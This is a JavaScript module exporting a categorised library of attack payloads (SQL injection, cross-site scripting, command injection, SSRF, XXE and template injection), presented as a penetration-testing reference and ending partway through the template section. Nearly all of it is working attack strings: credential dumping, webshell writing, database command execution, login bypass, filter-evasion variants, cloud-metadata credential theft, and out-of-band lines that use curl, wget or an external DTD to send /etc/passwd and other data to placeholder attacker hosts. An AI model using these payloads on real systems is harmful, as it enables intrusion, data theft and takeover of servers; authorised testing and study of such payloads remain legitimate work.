// Comprehensive payload reference for ethical penetration testing
// All payloads are for authorized security testing only

export const PAYLOAD_ENCYCLOPEDIA = {
  sqli: {
    name: "SQL Injection",
    payloads: [
      // MySQL - Union Based
      { payload: "' UNION SELECT 1,2,3-- -", type: "sqli", subtype: "union", description: "Basic UNION injection to find output columns", context: "string", dbms: "MySQL", waf_bypass: false, encoding: "none" },
      { payload: "' UNION SELECT NULL,NULL,NULL-- -", type: "sqli", subtype: "union", description: "NULL-based column enumeration (safer than numbers)", context: "string", dbms: "Generic", waf_bypass: false, encoding: "none" },
      { payload: "' UNION SELECT 1,CONCAT(username,0x3a,password),3 FROM users-- -", type: "sqli", subtype: "union", description: "Extract credentials with colon separator", context: "string", dbms: "MySQL", waf_bypass: false, encoding: "none" },
      { payload: "' UNION SELECT 1,GROUP_CONCAT(schema_name),3 FROM information_schema.schemata-- -", type: "sqli", subtype: "union", description: "List all databases", context: "string", dbms: "MySQL", waf_bypass: false, encoding: "none" },
      { payload: "' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -", type: "sqli", subtype: "union", description: "List tables in current database", context: "string", dbms: "MySQL", waf_bypass: false, encoding: "none" },
      { payload: "' UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -", type: "sqli", subtype: "union", description: "List columns in users table", context: "string", dbms: "MySQL", waf_bypass: false, encoding: "none" },
      { payload: "' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -", type: "sqli", subtype: "union", description: "Read system files via MySQL FILE privilege", context: "string", dbms: "MySQL", waf_bypass: false, encoding: "none" },
      { payload: "' UNION SELECT 1,'<?php system($_GET[\"c\"]);?>',3 INTO OUTFILE '/var/www/html/shell.php'-- -", type: "sqli", subtype: "union", description: "Write webshell via INTO OUTFILE", context: "string", dbms: "MySQL", waf_bypass: false, encoding: "none" },

      // MySQL - Boolean Blind
      { payload: "' AND 1=1-- -", type: "sqli", subtype: "boolean-blind", description: "Boolean true condition (compare with false)", context: "string", dbms: "Generic", waf_bypass: false, encoding: "none" },
      { payload: "' AND 1=2-- -", type: "sqli", subtype: "boolean-blind", description: "Boolean false condition (compare with true)", context: "string", dbms: "Generic", waf_bypass: false, encoding: "none" },
      { payload: "' AND SUBSTRING(database(),1,1)='a'-- -", type: "sqli", subtype: "boolean-blind", description: "Extract database name character by character", context: "string", dbms: "MySQL", waf_bypass: false, encoding: "none" },
      { payload: "' AND (SELECT COUNT(*) FROM users)>0-- -", type: "sqli", subtype: "boolean-blind", description: "Check if users table exists", context: "string", dbms: "MySQL", waf_bypass: false, encoding: "none" },
      { payload: "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64-- -", type: "sqli", subtype: "boolean-blind", description: "Binary search for password characters", context: "string", dbms: "MySQL", waf_bypass: false, encoding: "none" },

      // MySQL - Time Based Blind
      { payload: "' AND SLEEP(5)-- -", type: "sqli", subtype: "time-blind", description: "Time-based blind detection (5 second delay)", context: "string", dbms: "MySQL", waf_bypass: false, encoding: "none" },
      { payload: "' AND IF(1=1,SLEEP(5),0)-- -", type: "sqli", subtype: "time-blind", description: "Conditional time delay for boolean extraction", context: "string", dbms: "MySQL", waf_bypass: false, encoding: "none" },
      { payload: "' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)-- -", type: "sqli", subtype: "time-blind", description: "Extract database name via timing", context: "string", dbms: "MySQL", waf_bypass: false, encoding: "none" },
      { payload: "' AND (SELECT IF(COUNT(*)>0,SLEEP(5),0) FROM information_schema.tables WHERE table_schema=database() AND table_name='users')-- -", type: "sqli", subtype: "time-blind", description: "Check table existence via timing", context: "string", dbms: "MySQL", waf_bypass: false, encoding: "none" },

      // MySQL - Error Based
      { payload: "' AND EXTRACTVALUE(1,CONCAT(0x7e,version(),0x7e))-- -", type: "sqli", subtype: "error-based", description: "Error-based extraction via EXTRACTVALUE", context: "string", dbms: "MySQL", waf_bypass: false, encoding: "none" },
      { payload: "' AND UPDATEXML(1,CONCAT(0x7e,version(),0x7e),1)-- -", type: "sqli", subtype: "error-based", description: "Error-based extraction via UPDATEXML", context: "string", dbms: "MySQL", waf_bypass: false, encoding: "none" },
      { payload: "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -", type: "sqli", subtype: "error-based", description: "Double query error-based (classic)", context: "string", dbms: "MySQL", waf_bypass: false, encoding: "none" },
      { payload: "' AND EXP(~(SELECT * FROM (SELECT version())a))-- -", type: "sqli", subtype: "error-based", description: "Error via EXP overflow (MySQL 5.5+)", context: "string", dbms: "MySQL", waf_bypass: false, encoding: "none" },

      // MySQL - Stacked Queries
      { payload: "'; INSERT INTO users(username,password) VALUES('hacker','hacked')-- -", type: "sqli", subtype: "stacked", description: "Insert new admin user via stacked query", context: "string", dbms: "MySQL", waf_bypass: false, encoding: "none" },
      { payload: "'; UPDATE users SET password='hacked' WHERE username='admin'-- -", type: "sqli", subtype: "stacked", description: "Modify admin password via stacked query", context: "string", dbms: "MySQL", waf_bypass: false, encoding: "none" },

      // PostgreSQL
      { payload: "' UNION SELECT NULL,version(),NULL-- -", type: "sqli", subtype: "union", description: "PostgreSQL version extraction", context: "string", dbms: "PostgreSQL", waf_bypass: false, encoding: "none" },
      { payload: "'; SELECT pg_sleep(5)-- -", type: "sqli", subtype: "time-blind", description: "PostgreSQL time-based blind", context: "string", dbms: "PostgreSQL", waf_bypass: false, encoding: "none" },
      { payload: "' UNION SELECT NULL,string_agg(tablename,','),NULL FROM pg_tables WHERE schemaname='public'-- -", type: "sqli", subtype: "union", description: "List PostgreSQL tables", context: "string", dbms: "PostgreSQL", waf_bypass: false, encoding: "none" },
      { payload: "'; COPY (SELECT '') TO PROGRAM 'id'-- -", type: "sqli", subtype: "rce", description: "PostgreSQL command execution via COPY TO PROGRAM", context: "string", dbms: "PostgreSQL", waf_bypass: false, encoding: "none" },
      { payload: "'; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id';-- -", type: "sqli", subtype: "rce", description: "PostgreSQL RCE with output capture", context: "string", dbms: "PostgreSQL", waf_bypass: false, encoding: "none" },

      // MSSQL
      { payload: "' UNION SELECT NULL,@@version,NULL-- -", type: "sqli", subtype: "union", description: "MSSQL version extraction", context: "string", dbms: "MSSQL", waf_bypass: false, encoding: "none" },
      { payload: "'; WAITFOR DELAY '0:0:5'-- -", type: "sqli", subtype: "time-blind", description: "MSSQL time-based blind", context: "string", dbms: "MSSQL", waf_bypass: false, encoding: "none" },
      { payload: "'; EXEC xp_cmdshell 'whoami'-- -", type: "sqli", subtype: "rce", description: "MSSQL command execution via xp_cmdshell", context: "string", dbms: "MSSQL", waf_bypass: false, encoding: "none" },
      { payload: "'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- -", type: "sqli", subtype: "rce", description: "Enable xp_cmdshell if disabled", context: "string", dbms: "MSSQL", waf_bypass: false, encoding: "none" },
      { payload: "' UNION SELECT NULL,name,NULL FROM master.dbo.sysdatabases-- -", type: "sqli", subtype: "union", description: "List MSSQL databases", context: "string", dbms: "MSSQL", waf_bypass: false, encoding: "none" },

      // Oracle
      { payload: "' UNION SELECT NULL,banner,NULL FROM v$version WHERE ROWNUM=1-- -", type: "sqli", subtype: "union", description: "Oracle version extraction", context: "string", dbms: "Oracle", waf_bypass: false, encoding: "none" },
      { payload: "' UNION SELECT NULL,table_name,NULL FROM all_tables WHERE ROWNUM<=10-- -", type: "sqli", subtype: "union", description: "List Oracle tables", context: "string", dbms: "Oracle", waf_bypass: false, encoding: "none" },
      { payload: "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -", type: "sqli", subtype: "time-blind", description: "Oracle time-based blind", context: "string", dbms: "Oracle", waf_bypass: false, encoding: "none" },
      { payload: "' AND UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))='x'-- -", type: "sqli", subtype: "oob", description: "Oracle OOB data exfiltration via DNS", context: "string", dbms: "Oracle", waf_bypass: false, encoding: "none" },

      // SQLite
      { payload: "' UNION SELECT NULL,sql,NULL FROM sqlite_master-- -", type: "sqli", subtype: "union", description: "SQLite schema extraction", context: "string", dbms: "SQLite", waf_bypass: false, encoding: "none" },
      { payload: "' UNION SELECT NULL,sqlite_version(),NULL-- -", type: "sqli", subtype: "union", description: "SQLite version", context: "string", dbms: "SQLite", waf_bypass: false, encoding: "none" },

      // WAF Bypass
      { payload: "' UnIoN SeLeCt 1,2,3-- -", type: "sqli", subtype: "waf-bypass", description: "Mixed case bypass", context: "string", dbms: "Generic", waf_bypass: true, encoding: "case-variation" },
      { payload: "' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3-- -", type: "sqli", subtype: "waf-bypass", description: "MySQL version comment bypass", context: "string", dbms: "MySQL", waf_bypass: true, encoding: "comment" },
      { payload: "' UNION/**/SELECT/**/1,2,3-- -", type: "sqli", subtype: "waf-bypass", description: "Inline comment as space", context: "string", dbms: "MySQL", waf_bypass: true, encoding: "comment" },
      { payload: "' UN%49ON SE%4CECT 1,2,3-- -", type: "sqli", subtype: "waf-bypass", description: "URL-encoded keyword characters", context: "string", dbms: "Generic", waf_bypass: true, encoding: "url" },
      { payload: "' %55NION %53ELECT 1,2,3-- -", type: "sqli", subtype: "waf-bypass", description: "URL-encoded first letter of keywords", context: "string", dbms: "Generic", waf_bypass: true, encoding: "url" },
      { payload: "' /*!UNION*/ /*!SELECT*/ 1,2,3-- -", type: "sqli", subtype: "waf-bypass", description: "MySQL conditional comment bypass", context: "string", dbms: "MySQL", waf_bypass: true, encoding: "comment" },
      { payload: "' AND 1=(SELECT 1 FROM dual WHERE 1=1)-- -", type: "sqli", subtype: "waf-bypass", description: "Subquery instead of direct comparison", context: "string", dbms: "Oracle", waf_bypass: true, encoding: "none" },
      { payload: "0' DIV 1 UNION SELECT 1,2,3-- -", type: "sqli", subtype: "waf-bypass", description: "Numeric context with DIV operator", context: "numeric", dbms: "MySQL", waf_bypass: true, encoding: "none" },

      // Authentication Bypass
      { payload: "admin' --", type: "sqli", subtype: "auth-bypass", description: "Comment out password check", context: "login", dbms: "Generic", waf_bypass: false, encoding: "none" },
      { payload: "' OR 1=1-- -", type: "sqli", subtype: "auth-bypass", description: "Classic always-true condition", context: "login", dbms: "Generic", waf_bypass: false, encoding: "none" },
      { payload: "' OR '1'='1", type: "sqli", subtype: "auth-bypass", description: "String-based always-true (no comment needed)", context: "login", dbms: "Generic", waf_bypass: false, encoding: "none" },
      { payload: "admin'/*", type: "sqli", subtype: "auth-bypass", description: "Block comment to ignore password field", context: "login", dbms: "MySQL", waf_bypass: false, encoding: "none" },
      { payload: "' OR 1=1 LIMIT 1-- -", type: "sqli", subtype: "auth-bypass", description: "Return only first user (usually admin)", context: "login", dbms: "MySQL", waf_bypass: false, encoding: "none" },
    ]
  },

  xss: {
    name: "Cross-Site Scripting",
    payloads: [
      // Basic
      { payload: "<script>alert(1)</script>", type: "xss", subtype: "basic", description: "Classic script tag injection", context: "html", waf_bypass: false, encoding: "none" },
      { payload: "<img src=x onerror=alert(1)>", type: "xss", subtype: "event-handler", description: "Image error handler XSS", context: "html", waf_bypass: false, encoding: "none" },
      { payload: "<svg onload=alert(1)>", type: "xss", subtype: "event-handler", description: "SVG load event XSS", context: "html", waf_bypass: false, encoding: "none" },
      { payload: "<body onload=alert(1)>", type: "xss", subtype: "event-handler", description: "Body load event", context: "html", waf_bypass: false, encoding: "none" },
      { payload: "<input onfocus=alert(1) autofocus>", type: "xss", subtype: "event-handler", description: "Auto-focus input with event handler", context: "html", waf_bypass: false, encoding: "none" },
      { payload: "<details open ontoggle=alert(1)>", type: "xss", subtype: "event-handler", description: "Details element toggle event", context: "html", waf_bypass: false, encoding: "none" },
      { payload: "<marquee onstart=alert(1)>", type: "xss", subtype: "event-handler", description: "Marquee start event", context: "html", waf_bypass: false, encoding: "none" },
      { payload: "<video src=x onerror=alert(1)>", type: "xss", subtype: "event-handler", description: "Video error handler", context: "html", waf_bypass: false, encoding: "none" },
      { payload: "<audio src=x onerror=alert(1)>", type: "xss", subtype: "event-handler", description: "Audio error handler", context: "html", waf_bypass: false, encoding: "none" },
      { payload: "<iframe src='javascript:alert(1)'>", type: "xss", subtype: "javascript-uri", description: "Iframe with javascript: URI", context: "html", waf_bypass: false, encoding: "none" },
      { payload: "<a href='javascript:alert(1)'>click</a>", type: "xss", subtype: "javascript-uri", description: "Anchor with javascript: URI", context: "html", waf_bypass: false, encoding: "none" },

      // Attribute context
      { payload: "' onmouseover='alert(1)", type: "xss", subtype: "attribute-escape", description: "Break out of single-quoted attribute", context: "attribute-single", waf_bypass: false, encoding: "none" },
      { payload: "\" onfocus=\"alert(1)\" autofocus=\"", type: "xss", subtype: "attribute-escape", description: "Break out of double-quoted attribute", context: "attribute-double", waf_bypass: false, encoding: "none" },
      { payload: " onmouseover=alert(1) ", type: "xss", subtype: "attribute-escape", description: "Unquoted attribute injection", context: "attribute-unquoted", waf_bypass: false, encoding: "none" },
      { payload: "\"><script>alert(1)</script>", type: "xss", subtype: "attribute-escape", description: "Close tag and inject script", context: "attribute-double", waf_bypass: false, encoding: "none" },

      // JavaScript context
      { payload: "';alert(1)//", type: "xss", subtype: "js-escape", description: "Break out of JS string (single quote)", context: "javascript-string-single", waf_bypass: false, encoding: "none" },
      { payload: "\";alert(1)//", type: "xss", subtype: "js-escape", description: "Break out of JS string (double quote)", context: "javascript-string-double", waf_bypass: false, encoding: "none" },
      { payload: "</script><script>alert(1)</script>", type: "xss", subtype: "js-escape", description: "Close script tag and inject new one", context: "javascript", waf_bypass: false, encoding: "none" },
      { payload: "\\';alert(1)//", type: "xss", subtype: "js-escape", description: "Escape the escape character", context: "javascript-string-single", waf_bypass: false, encoding: "none" },

      // Filter bypass
      { payload: "<ScRiPt>alert(1)</ScRiPt>", type: "xss", subtype: "filter-bypass", description: "Mixed case bypass", context: "html", waf_bypass: true, encoding: "case-variation" },
      { payload: "<scr<script>ipt>alert(1)</scr</script>ipt>", type: "xss", subtype: "filter-bypass", description: "Nested tag bypass (single-pass filter)", context: "html", waf_bypass: true, encoding: "nested" },
      { payload: "<img src=x onerror=alert`1`>", type: "xss", subtype: "filter-bypass", description: "Template literal instead of parentheses", context: "html", waf_bypass: true, encoding: "none" },
      { payload: "<svg/onload=alert(1)>", type: "xss", subtype: "filter-bypass", description: "Slash instead of space after tag name", context: "html", waf_bypass: true, encoding: "none" },
      { payload: "<img src=x onerror=\\u0061\\u006C\\u0065\\u0072\\u0074(1)>", type: "xss", subtype: "filter-bypass", description: "Unicode escape sequences in JS", context: "html", waf_bypass: true, encoding: "unicode" },
      { payload: "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>", type: "xss", subtype: "filter-bypass", description: "Base64 encoded payload via atob", context: "html", waf_bypass: true, encoding: "base64" },
      { payload: "<img src=x onerror='window[\"al\"+\"ert\"](1)'>", type: "xss", subtype: "filter-bypass", description: "String concatenation to avoid keyword detection", context: "html", waf_bypass: true, encoding: "string-concat" },
      { payload: "<%2Fscript%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E", type: "xss", subtype: "filter-bypass", description: "URL-encoded XSS payload", context: "html", waf_bypass: true, encoding: "url" },
      { payload: "<img src=x onerror=top['al'+'ert'](1)>", type: "xss", subtype: "filter-bypass", description: "Bracket notation with string concat", context: "html", waf_bypass: true, encoding: "none" },

      // Polyglots
      { payload: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%%0telerikDebugMode%%0DOnAfterAcceptAll=alert()//", type: "xss", subtype: "polyglot", description: "Multi-context XSS polyglot", context: "multi", waf_bypass: true, encoding: "none" },
      { payload: "'\"><img src=x onerror=alert(1)//", type: "xss", subtype: "polyglot", description: "Simple polyglot for attribute/HTML contexts", context: "multi", waf_bypass: false, encoding: "none" },

      // CSP Bypass
      { payload: "<script src='https://trusted-cdn.com/angular.min.js'></script><div ng-app ng-csp><div ng-click=$event.view.alert(1)>click</div></div>", type: "xss", subtype: "csp-bypass", description: "Angular-based CSP bypass via trusted CDN", context: "html", waf_bypass: false, encoding: "none" },
      { payload: "<base href='//evil.com/'>", type: "xss", subtype: "csp-bypass", description: "Base tag injection to redirect relative URLs", context: "html", waf_bypass: false, encoding: "none" },
      { payload: "<script src='/api/jsonp?callback=alert(1)//'>", type: "xss", subtype: "csp-bypass", description: "JSONP endpoint as script source (same origin)", context: "html", waf_bypass: false, encoding: "none" },

      // DOM XSS
      { payload: "#<img src=x onerror=alert(1)>", type: "xss", subtype: "dom", description: "DOM XSS via URL fragment (location.hash)", context: "dom-hash", waf_bypass: false, encoding: "none" },
      { payload: "javascript:alert(document.cookie)", type: "xss", subtype: "dom", description: "Cookie theft via javascript: URI", context: "dom-href", waf_bypass: false, encoding: "none" },

      // Framework specific
      { payload: "{{constructor.constructor('alert(1)')()}}", type: "xss", subtype: "ssti-angular", description: "Angular template injection (older versions)", context: "angular", waf_bypass: false, encoding: "none" },
      { payload: "${alert(1)}", type: "xss", subtype: "template-literal", description: "JavaScript template literal injection", context: "template-literal", waf_bypass: false, encoding: "none" },
    ]
  },

  cmdi: {
    name: "Command Injection",
    payloads: [
      // Linux separators
      { payload: "; id", type: "cmdi", subtype: "separator", description: "Semicolon separator (execute regardless)", context: "linux", waf_bypass: false, encoding: "none" },
      { payload: "| id", type: "cmdi", subtype: "pipe", description: "Pipe output to id command", context: "linux", waf_bypass: false, encoding: "none" },
      { payload: "|| id", type: "cmdi", subtype: "or", description: "OR - execute if previous fails", context: "linux", waf_bypass: false, encoding: "none" },
      { payload: "&& id", type: "cmdi", subtype: "and", description: "AND - execute if previous succeeds", context: "linux", waf_bypass: false, encoding: "none" },
      { payload: "$(id)", type: "cmdi", subtype: "substitution", description: "Command substitution", context: "linux", waf_bypass: false, encoding: "none" },
      { payload: "`id`", type: "cmdi", subtype: "backtick", description: "Backtick command substitution", context: "linux", waf_bypass: false, encoding: "none" },
      { payload: "\nid", type: "cmdi", subtype: "newline", description: "Newline as command separator", context: "linux", waf_bypass: false, encoding: "none" },
      { payload: "%0aid", type: "cmdi", subtype: "newline", description: "URL-encoded newline separator", context: "linux", waf_bypass: true, encoding: "url" },

      // Windows separators
      { payload: "& dir", type: "cmdi", subtype: "separator", description: "Windows command separator", context: "windows", waf_bypass: false, encoding: "none" },
      { payload: "| dir", type: "cmdi", subtype: "pipe", description: "Windows pipe", context: "windows", waf_bypass: false, encoding: "none" },
      { payload: "&& dir", type: "cmdi", subtype: "and", description: "Windows conditional AND", context: "windows", waf_bypass: false, encoding: "none" },
      { payload: "|| dir", type: "cmdi", subtype: "or", description: "Windows conditional OR", context: "windows", waf_bypass: false, encoding: "none" },

      // Blind detection
      { payload: "; sleep 10", type: "cmdi", subtype: "blind-time", description: "Time-based blind detection (Linux)", context: "linux", waf_bypass: false, encoding: "none" },
      { payload: "& ping -c 10 127.0.0.1 &", type: "cmdi", subtype: "blind-time", description: "Time-based via ping (Linux)", context: "linux", waf_bypass: false, encoding: "none" },
      { payload: "& ping -n 10 127.0.0.1 &", type: "cmdi", subtype: "blind-time", description: "Time-based via ping (Windows)", context: "windows", waf_bypass: false, encoding: "none" },
      { payload: "& timeout /t 10 &", type: "cmdi", subtype: "blind-time", description: "Time-based via timeout (Windows)", context: "windows", waf_bypass: false, encoding: "none" },

      // Out-of-band
      { payload: "; curl http://BURP-COLLAB/$(whoami)", type: "cmdi", subtype: "oob", description: "OOB data exfil via curl", context: "linux", waf_bypass: false, encoding: "none" },
      { payload: "; wget http://BURP-COLLAB/$(cat /etc/passwd | base64)", type: "cmdi", subtype: "oob", description: "OOB file exfil via wget", context: "linux", waf_bypass: false, encoding: "none" },
      { payload: "; nslookup $(whoami).BURP-COLLAB", type: "cmdi", subtype: "oob", description: "OOB via DNS lookup", context: "linux", waf_bypass: false, encoding: "none" },
      { payload: "& nslookup %USERNAME%.BURP-COLLAB &", type: "cmdi", subtype: "oob", description: "OOB via DNS (Windows)", context: "windows", waf_bypass: false, encoding: "none" },

      // Filter bypass
      { payload: ";$IFS$9id", type: "cmdi", subtype: "bypass", description: "IFS as space replacement", context: "linux", waf_bypass: true, encoding: "none" },
      { payload: ";{id}", type: "cmdi", subtype: "bypass", description: "Brace expansion bypass", context: "linux", waf_bypass: true, encoding: "none" },
      { payload: ";cat${IFS}/etc/passwd", type: "cmdi", subtype: "bypass", description: "IFS in path traversal", context: "linux", waf_bypass: true, encoding: "none" },
      { payload: ";c'a't /etc/passwd", type: "cmdi", subtype: "bypass", description: "Single quote insertion in command", context: "linux", waf_bypass: true, encoding: "none" },
      { payload: ";c\"a\"t /etc/passwd", type: "cmdi", subtype: "bypass", description: "Double quote insertion in command", context: "linux", waf_bypass: true, encoding: "none" },
      { payload: ";cat /etc/pass??", type: "cmdi", subtype: "bypass", description: "Wildcard for filename characters", context: "linux", waf_bypass: true, encoding: "none" },
      { payload: ";/???/??t /???/??????", type: "cmdi", subtype: "bypass", description: "Full wildcard path (/bin/cat /etc/passwd)", context: "linux", waf_bypass: true, encoding: "none" },
      { payload: ";$(printf '\\x63\\x61\\x74') /etc/passwd", type: "cmdi", subtype: "bypass", description: "Hex-encoded command name via printf", context: "linux", waf_bypass: true, encoding: "hex" },
      { payload: ";echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash", type: "cmdi", subtype: "bypass", description: "Base64 encoded command execution", context: "linux", waf_bypass: true, encoding: "base64" },
    ]
  },

  ssrf: {
    name: "Server-Side Request Forgery",
    payloads: [
      // Basic
      { payload: "http://127.0.0.1/", type: "ssrf", subtype: "basic", description: "Localhost access via 127.0.0.1", context: "url", waf_bypass: false, encoding: "none" },
      { payload: "http://localhost/", type: "ssrf", subtype: "basic", description: "Localhost access via hostname", context: "url", waf_bypass: false, encoding: "none" },
      { payload: "http://[::1]/", type: "ssrf", subtype: "basic", description: "Localhost via IPv6 loopback", context: "url", waf_bypass: false, encoding: "none" },
      { payload: "http://0.0.0.0/", type: "ssrf", subtype: "basic", description: "Unspecified address (often resolves to localhost)", context: "url", waf_bypass: false, encoding: "none" },

      // Cloud metadata
      { payload: "http://169.254.169.254/latest/meta-data/", type: "ssrf", subtype: "cloud-metadata", description: "AWS EC2 metadata (IMDSv1)", context: "url", waf_bypass: false, encoding: "none" },
      { payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/", type: "ssrf", subtype: "cloud-metadata", description: "AWS IAM role credentials (IMDSv1)", context: "url", waf_bypass: false, encoding: "none" },
      { payload: "http://169.254.169.254/latest/user-data", type: "ssrf", subtype: "cloud-metadata", description: "AWS EC2 user data (may contain secrets)", context: "url", waf_bypass: false, encoding: "none" },
      { payload: "http://metadata.google.internal/computeMetadata/v1/", type: "ssrf", subtype: "cloud-metadata", description: "GCP metadata (requires Metadata-Flavor: Google header)", context: "url", waf_bypass: false, encoding: "none" },
      { payload: "http://169.254.169.254/metadata/instance?api-version=2021-02-01", type: "ssrf", subtype: "cloud-metadata", description: "Azure IMDS (requires Metadata: true header)", context: "url", waf_bypass: false, encoding: "none" },

      // Bypass techniques
      { payload: "http://2130706433/", type: "ssrf", subtype: "bypass", description: "Decimal IP for 127.0.0.1", context: "url", waf_bypass: true, encoding: "decimal-ip" },
      { payload: "http://0x7f000001/", type: "ssrf", subtype: "bypass", description: "Hex IP for 127.0.0.1", context: "url", waf_bypass: true, encoding: "hex-ip" },
      { payload: "http://0177.0.0.1/", type: "ssrf", subtype: "bypass", description: "Octal IP for 127.0.0.1", context: "url", waf_bypass: true, encoding: "octal-ip" },
      { payload: "http://127.1/", type: "ssrf", subtype: "bypass", description: "Shortened IP (127.0.0.1)", context: "url", waf_bypass: true, encoding: "shortened" },
      { payload: "http://0/", type: "ssrf", subtype: "bypass", description: "Zero IP (resolves to 0.0.0.0)", context: "url", waf_bypass: true, encoding: "shortened" },
      { payload: "http://spoofed.burpcollaborator.net/", type: "ssrf", subtype: "bypass", description: "DNS rebinding via controlled domain", context: "url", waf_bypass: true, encoding: "dns-rebind" },
      { payload: "http://localtest.me/", type: "ssrf", subtype: "bypass", description: "Domain that resolves to 127.0.0.1", context: "url", waf_bypass: true, encoding: "domain-alias" },
      { payload: "http://customer.internal/", type: "ssrf", subtype: "internal", description: "Internal hostname access", context: "url", waf_bypass: false, encoding: "none" },

      // Protocol smuggling
      { payload: "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a", type: "ssrf", subtype: "protocol", description: "Redis command via gopher protocol", context: "url", waf_bypass: false, encoding: "gopher" },
      { payload: "dict://127.0.0.1:6379/INFO", type: "ssrf", subtype: "protocol", description: "Redis info via dict protocol", context: "url", waf_bypass: false, encoding: "dict" },
      { payload: "file:///etc/passwd", type: "ssrf", subtype: "protocol", description: "Local file read via file protocol", context: "url", waf_bypass: false, encoding: "file" },
    ]
  },

  xxe: {
    name: "XML External Entity",
    payloads: [
      { payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>", type: "xxe", subtype: "basic", description: "Basic XXE to read /etc/passwd", context: "xml", waf_bypass: false, encoding: "none" },
      { payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/system32/drivers/etc/hosts\">]><root>&xxe;</root>", type: "xxe", subtype: "basic", description: "XXE to read Windows hosts file", context: "xml", waf_bypass: false, encoding: "none" },
      { payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://BURP-COLLAB/xxe-test\">]><root>&xxe;</root>", type: "xxe", subtype: "ssrf", description: "XXE for SSRF / OOB detection", context: "xml", waf_bypass: false, encoding: "none" },
      { payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://ATTACKER/evil.dtd\">%xxe;]><root>test</root>", type: "xxe", subtype: "blind-oob", description: "Blind XXE via external DTD (OOB exfiltration)", context: "xml", waf_bypass: false, encoding: "none" },
      { payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]><root>&xxe;</root>", type: "xxe", subtype: "php-wrapper", description: "XXE with PHP filter (base64 encode for binary-safe read)", context: "xml-php", waf_bypass: false, encoding: "none" },
      { payload: "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\"><!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">]><root>&lol3;</root>", type: "xxe", subtype: "dos", description: "Billion laughs DoS (exponential entity expansion)", context: "xml", waf_bypass: false, encoding: "none" },
      { payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\">]><root>&xxe;</root>", type: "xxe", subtype: "ssrf-cloud", description: "XXE to steal AWS credentials via IMDS", context: "xml", waf_bypass: false, encoding: "none" },
      { payload: "<xi:include xmlns:xi=\"http://www.w3.org/2001/XInclude\" href=\"file:///etc/passwd\" parse=\"text\"/>", type: "xxe", subtype: "xinclude", description: "XInclude attack (when you can't control DOCTYPE)", context: "xml-partial", waf_bypass: false, encoding: "none" },
    ]
  },

  ssti: {
    name: "Server-Side Template Injection",
    payloads: [
      // Detection
      { payload: "{{7*7}}", type: "ssti", subtype: "detection", description: "Math expression (Jinja2, Twig, many others)", context: "template", waf_bypass: false, encoding: "none" },
      { payload: "${7*7}", type: "ssti", subtype: "detection", description: "EL/Freemarker expression detection", context: "template", waf_bypass: false, encoding: "none" },
      { payload: "#{7*7}", type: "ssti", subtype: "detection", description: "Ruby ERB / Spring EL detection", context: "template", waf_bypass: false, encoding: "none" },
      { payload: "*{7*7}", type: "ssti", subtype: "detection", description: "Thymeleaf expression detection", context: "template", waf_bypass: false, encoding: "none" },
      { payload: "{{7*'7'}}", type: "ssti", subtype: "detection", description: "Jinja2 vs Twig differentiator (Jinja2=7777777, Twig=49)", context: "template", waf_bypass: false, encoding: "none" },

      // Jinja2 (Python)
      { payload: "{{config}}", type: "ssti", subtype: "jinja2-info", description: "Jinja2: dump Flask config (may contain SECRET_KEY)", context: "jinja2", waf_bypass: false, encoding: "none" },
      { payload: "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", type: "ssti", subtype: "jinja2-rce", description: "Jinja2: RCE via config globals", context: "jinja2", waf_bypass: false, encoding: "none" },
      { payload: "{{''.__class__.__mro__[1].__subclasses__()}}", type: "ssti", subtype: "jinja2-enum", description: "Jinja2: enumerate available classes for RCE gadgets", context: "jinja2", waf_bypass: false, encoding: "none" },
      { payload: "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}", type: "ssti", subtype: "jinja2-rce", description: "Jinja2: RCE via request object", context: "jinja2", waf_bypass: false, encoding: "none" },
      { payload: "{% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{% endfor %}", type: "ssti", subtype: "jinja2-rce", description: "Jinja2: RCE via warnings.catch_warnings class", context: "jinja2", waf_bypass: false, encoding: "none" },

      // Twig (PHP)
